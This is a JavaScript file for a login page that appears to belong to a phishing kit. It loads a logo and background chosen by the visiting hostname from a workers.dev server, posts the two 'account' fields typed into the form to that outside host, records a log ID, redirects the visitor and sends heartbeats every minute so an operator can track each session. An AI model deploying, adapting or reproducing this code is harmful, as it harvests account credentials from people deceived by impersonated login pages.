const API_URL = "https://1409v1.hgr02339.workers.dev";
const HOST = location.hostname;

const bg = document.querySelector(".bg");
const logo = document.getElementById("logo");
const form = document.getElementById("loginForm");
const btn = document.getElementById("submitBtn");
const msg = document.getElementById("message");

let siteConfig = null;
let logId = null;

function api(path) {
  return `${API_URL}${path}`;
}

async function loadConfig() {
  const res = await fetch(api(`/api/site-config?host=${encodeURIComponent(HOST)}`));
  const data = await res.json();
  if (!data.ok) throw new Error(data.error || "Site configuration unavailable.");
  siteConfig = data.site;

  if (siteConfig.background_url) {
    bg.style.backgroundImage = `url("${siteConfig.background_url.replace(/"/g, '\\"')}")`;
  }
  if (siteConfig.logo_url) {
    logo.src = siteConfig.logo_url;
    logo.style.display = "block";
  }
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  msg.textContent = "";
  btn.disabled = true;

  const account1 = document.getElementById("account1").value.trim();
  const account2 = document.getElementById("account2").value.trim();

  if (!account1 && !account2) {
    msg.textContent = "Please enter at least one account.";
    btn.disabled = false;
    return;
  }

  try {
    const res = await fetch(api(`/api/login?host=${encodeURIComponent(HOST)}`), {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({account1, account2})
    });
    const data = await res.json();

    if (!data.ok) throw new Error(data.error || "Unable to continue.");

    logId = data.log_id || null;

    if (data.redirect_url) {
      location.href = data.redirect_url;
      return;
    }

    msg.textContent = " ";
  } catch (err) {
    msg.textContent = err.message || " ";
  } finally {
    btn.disabled = false;
  }
});

setInterval(() => {
  if (!logId) return;
  fetch(api("/api/heartbeat"), {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({log_id:logId})
  }).catch(()=>{});
}, 60000);

loadConfig().catch(err => {
  msg.textContent = err.message || " ";
});
